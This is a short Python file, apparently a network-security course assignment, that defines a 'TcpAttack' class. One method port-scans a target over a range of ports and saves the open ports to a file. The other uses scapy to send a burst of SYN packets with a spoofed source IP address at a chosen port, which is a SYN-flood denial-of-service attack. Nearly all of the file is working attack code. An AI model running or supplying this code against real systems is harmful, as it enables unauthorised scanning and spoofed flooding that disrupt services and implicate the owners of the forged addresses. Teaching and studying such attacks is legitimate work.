import socket
from scapy.all import *

class TcpAttack():
    def __init__(self, spoofIP, targetIP):
        self.spoof = spoofIP
        self.target = targetIP

    def scanTarget(self,rangeStart, rangeEnd):
        #port scanning function taken and modified from Prof. Avi's website
        open_ports = []
        # Scan the ports in the specified range:
        for testport in range(rangeStart, rangeEnd+1):
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
            sock.settimeout(0.1)
            try:
                sock.connect((self.target, testport))
                print(testport)
                open_ports.append(str(testport))
            except:
                pass

        with open("openports.txt", 'w') as f:
            f.write('\n'.join(open_ports))

    def attackTarget(self, port):
        for i in range(100):
            IP_header= IP(src=self.spoof, dst=self.target)
            TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)
            packet = IP_header / TCP_header
            print(type(packet))
            try:
               send(packet)
            except Exception as e:
               print(e)

